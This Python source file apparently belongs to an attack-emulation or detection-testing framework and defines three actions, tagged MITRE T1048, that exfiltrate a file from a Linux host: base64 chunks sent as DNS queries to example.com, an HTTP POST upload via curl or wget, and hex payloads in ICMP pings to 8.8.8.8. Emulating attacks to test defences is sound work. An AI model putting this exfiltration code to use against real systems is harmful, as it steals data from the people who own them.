from urllib.parse import urlparse
from .SendFileBase import SendFileBase


def _extract_domain_from_url(url: str) -> str:
    """
    Safely extract the domain/hostname from a URL.
    
    Args:
        url: The URL to parse
        
    Returns:
        The domain/hostname, or empty string if parsing fails
    """
    try:
        parsed = urlparse(url)
        if parsed.netloc:
            # netloc includes port, so split on ':' to get just the hostname
            return parsed.netloc.split(':')[0]
        return ""
    except (ValueError, AttributeError):
        # Handle malformed URLs gracefully
        return ""


class SendFileUDP(SendFileBase):
    """
    Send a file to a remote location via DNS (UDP) exfiltration.
    
    This action sends files using DNS exfiltration (using dig) over UDP.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileUDP", "udp", technique="T1048")


    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
        """
        Send file via DNS exfiltration using base64 encoding and dig (with nslookup/host fallback).
        """
        # Encode file to base64
        encoded_data, encode_status = self._encode_file(live_session, file_path)
        if encode_status != 0:
            return "Failed to read and encode file", 1, ""
        
        # Filter out any invalid characters (shell prompts, whitespace, etc.) from base64 output
        # Base64 uses: A-Z, a-z, 0-9, +, /, and = (for padding)
        valid_base64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
        filtered_data = ''.join(c for c in encoded_data if c in valid_base64_chars)
        
        # Check if filtering removed significant data (more than just whitespace/prompts)
        if len(filtered_data) < len(encoded_data) * 0.9:  # If we lost more than 10% of data
            invalid_chars = set(c for c in encoded_data if c not in valid_base64_chars)
            # Only report if there are significant invalid characters (not just whitespace)
            significant_invalid = [c for c in invalid_chars if c not in ' \n\r\t']
            if significant_invalid:
                return f"ERROR: Base64 encoded data contains invalid characters: {''.join(sorted(significant_invalid))}. This may indicate encoding issues.", 1, ""
        
        # Use filtered data (removes shell artifacts while preserving valid base64)
        encoded_data = filtered_data
        
        # Split into chunks (DNS labels max 63 chars, use 50 for safety)
        chunk_size = 50
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        # Send chunks via DNS queries to a default DNS server
        target_domain = "example.com"
        dns_server = "8.8.8.8"
        
        # Determine which DNS tool to use (try busybox nslookup first since we know it works, then others)
        dns_tool = None
        
        # Check tool availability using which
        check_busybox = live_session.run_command("which busybox 2>&1")
        check_nslookup = live_session.run_command("which nslookup 2>&1")
        check_host = live_session.run_command("which host 2>&1")
        check_getent = live_session.run_command("which getent 2>&1")
        check_python3 = live_session.run_command("which python3 2>&1")
        check_perl = live_session.run_command("which perl 2>&1")
        check_dig = live_session.run_command("which dig 2>&1")
        
        # Try tools in order of preference (busybox first since we know it works)
        if "busybox" in check_busybox and "not found" not in check_busybox.lower():
            dns_tool = ("busybox nslookup", f"busybox nslookup {{query}} {dns_server} 2>&1")
        elif "nslookup" in check_nslookup and "not found" not in check_nslookup.lower():
            dns_tool = ("nslookup", f"nslookup -type=A {{query}} {dns_server} 2>&1")
        elif "host" in check_host and "not found" not in check_host.lower():
            dns_tool = ("host", f"host {{query}} {dns_server} 2>&1")
        elif "getent" in check_getent and "not found" not in check_getent.lower():
            dns_tool = ("getent", f"getent hosts {{query}} 2>&1")
        elif "python3" in check_python3 and "not found" not in check_python3.lower():
            dns_tool = ("python3", f"python3 -c \"import socket; print(socket.gethostbyname('{{query}}'))\" 2>&1")
        elif "perl" in check_perl and "not found" not in check_perl.lower():
            dns_tool = ("perl", f"perl -e \"use Socket; print gethostbyname('{{query}}')\" 2>&1")
        elif "dig" in check_dig and "not found" not in check_dig.lower():
            dns_tool = ("dig", f"dig @{dns_server} {{query}} +short 2>&1")
        
        if not dns_tool:
            return "ERROR: No DNS lookup tools found (dig, nslookup, host, busybox, getent, python3, or perl). Please install one to use DNS/UDP file transfer.", 1, ""
        
        tool_name, tool_cmd_template = dns_tool
        results = []
        
        for i, chunk in enumerate(chunks):
            # Clean chunk for DNS (remove invalid chars)
            # Since we validated the data above, this should not remove any characters,
            # but we keep it as a safety measure for DNS label restrictions
            clean_chunk = ''.join(c for c in chunk if c.isalnum() or c in ['+', '/', '='])
            
            # Track if cleaning removed any characters (shouldn't happen after validation)
            if len(clean_chunk) != len(chunk):
                removed_chars = len(chunk) - len(clean_chunk)
                return f"ERROR: Chunk cleaning removed {removed_chars} character(s) from chunk {i}. This indicates invalid base64 data despite validation.", 1, target_domain
            
            dns_cmd = tool_cmd_template.format(query=f"{clean_chunk}.{i}.{target_domain}")
            result = live_session.run_command(dns_cmd)
            
            # Check for command not found errors (shouldn't happen after test, but just in case)
            if "not found" in result.lower() or "command not found" in result.lower():
                return f"ERROR: {tool_name} command failed: {result}", 1, target_domain
            
            results.append(result)
            # Limit output to first 10 chunks for testing
            if i >= 9:
                break
        
        output = f"Sent {min(len(chunks), 10)} DNS chunks via UDP to {dns_server}\n" + "\n".join(results[:5])
        exit_status = 0
        return output, exit_status, target_domain



class SendFileHTTP(SendFileBase):
    """
    Send a file to a remote location via HTTP POST.
    
    This action sends files using HTTP POST (using curl) over TCP.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileHTTP", "http")

    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
        """
        Send file via HTTP POST using curl, with wget as fallback.
        """
        escaped_path = self._escape_path_for_shell(file_path)
        target_url = "http://example.com/upload"
        
        # Check if curl is available
        check_curl = live_session.run_command("which curl 2>&1")
        use_curl = "curl" in check_curl and "not found" not in check_curl.lower()
        
        if use_curl:
            # Try curl first
            # Capture both output and exit code to determine if command executed successfully
            cmd = f"curl -X POST -F 'file=@{escaped_path}' {target_url} 2>&1; echo 'CURL_EXIT_CODE:$?'"
            output = live_session.run_command(cmd)
            
            # Check for curl errors (command not found)
            if "not found" in output.lower() or "command not found" in output.lower():
                use_curl = False  # Fall back to wget
            else:
                # Parse exit code from output
                # We use exit codes rather than string matching (e.g., checking for "200", "201", "OK")
                # to avoid false positives from error messages that might contain those words
                exit_code = 1  # Default to failure
                for line in output.split("\n"):
                    if line.strip().startswith("CURL_EXIT_CODE:"):
                        try:
                            exit_code = int(line.split(":")[1].strip())
                            break
                        except (ValueError, IndexError):
                            pass
                
                # Remove the exit code line from output for cleaner output
                clean_output = "\n".join(
                    line for line in output.split("\n") 
                    if not line.strip().startswith("CURL_EXIT_CODE:")
                )
                
                # exit_status reflects whether curl executed successfully (exit code 0)
                # not whether the HTTP response was successful
                # Using exit code prevents false positives from string matching output
                exit_status = 0 if exit_code == 0 else 1
                # Extract domain from URL (example.com from http://example.com/upload)
                target_domain = _extract_domain_from_url(target_url)
                return clean_output, exit_status, target_domain
        
        # Fallback to wget if curl failed or not available
        if not use_curl:
            check_wget = live_session.run_command("which wget 2>&1")
            if "wget" not in check_wget or "not found" in check_wget.lower():
                return "ERROR: Neither curl nor wget found. Please install one to use HTTP file transfer.", 1, ""
            
            # wget doesn't support multipart/form-data POST like curl, so we'll use --post-file
            # For a more realistic approach, we could base64 encode and send as data
            # Capture both output and exit code to determine if command executed successfully
            cmd = f"wget --post-file='{escaped_path}' {target_url} -O /dev/null 2>&1; echo 'WGET_EXIT_CODE:$?'"
            output = live_session.run_command(cmd)
            
            # Check for wget errors (command not found)
            if "not found" in output.lower() or "command not found" in output.lower():
                return f"ERROR: wget command failed: {output}", 1, ""
            
            # Parse exit code from output
            # We use exit codes rather than string matching (e.g., checking for "saved", "200 OK")
            # to avoid false positives from error messages that might contain those words
            exit_code = 1  # Default to failure
            for line in output.split("\n"):
                if line.strip().startswith("WGET_EXIT_CODE:"):
                    try:
                        exit_code = int(line.split(":")[1].strip())
                        break
                    except (ValueError, IndexError):
                        pass
            
            # Remove the exit code line from output for cleaner output
            clean_output = "\n".join(
                line for line in output.split("\n") 
                if not line.strip().startswith("WGET_EXIT_CODE:")
            )
            
            # exit_status reflects whether wget executed successfully (exit code 0)
            # not whether the HTTP response was successful
            # Using exit code prevents false positives from string matching output
            exit_status = 0 if exit_code == 0 else 1
            # Extract domain from URL (example.com from http://example.com/upload)
            target_domain = _extract_domain_from_url(target_url)
            return clean_output, exit_status, target_domain
        
        return "ERROR: Failed to send file", 1, ""


class SendFileICMP(SendFileBase):
    """
    Send a file to a remote location via ICMP exfiltration.
    
    This action sends files using ICMP ping packets with data payload.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileICMP", "icmp", technique="T1048")

    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
        """
        Send file via ICMP exfiltration using ping with data payload.
        """
        encoded_data, encode_status = self._encode_file(live_session, file_path)
        if encode_status != 0:
            return "Failed to read and encode file", 1, ""
        
        # ICMP ping payload is limited to 8 bytes of hex data (16 hex characters)
        # Each chunk is 8 characters of base64, which becomes 8 bytes when encoded to hex
        chunk_size = 8
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        target_ip = "8.8.8.8"
        
        results = []
        for i, chunk in enumerate(chunks[:10]):  # Limit to 10 for testing
            hex_data = chunk.encode().hex()
            ping_cmd = f"ping -c 1 -p {hex_data} {target_ip} 2>&1"
            result = live_session.run_command(ping_cmd)
            results.append(result)
        
        output = f"Sent {min(len(chunks), 10)} ICMP packets to {target_ip}\n" + "\n".join(results[:3])
        exit_status = 0
        return output, exit_status, target_ip

